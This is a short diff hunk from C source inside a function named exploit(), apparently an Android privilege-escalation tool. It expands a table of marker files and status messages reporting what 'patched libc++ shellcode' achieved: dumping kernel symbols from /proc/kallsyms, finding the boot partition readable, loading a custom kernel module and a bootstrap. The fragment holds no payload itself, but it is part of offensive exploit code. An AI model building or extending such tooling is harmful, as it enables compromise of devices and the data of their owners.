@@ -567,9 +567,13 @@ static int exploit(void) {
         const char *msg;
         int         rc;
     } markers[] = {
-        /* probe result from the patched libc++ shellcode */
-        { "/dev/ksok",   "kallsyms: dump written to /data/local/tmp/ks.txt",  5 },
-        { "/dev/ksfail", "kallsyms: dump FAILED (open/read denied)",          5 },
+        /* tagged probe results from the patched libc++ shellcode */
+        { "/dev/ksok",  "PROBE ksok  : kallsyms dumped",                5 },
+        { "/dev/k0",    "PROBE k0    : /proc/kallsyms open DENIED",      5 },
+        { "/dev/kb",    "PROBE kb    : boot partition readable",         5 },
+        { "/dev/kx",    "PROBE kx    : no writable output path",         5 },
+        { "/dev/kr",    "PROBE kr    : read() failed",                   5 },
+        { "/dev/kw",    "PROBE kw    : write() failed",                  5 },
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
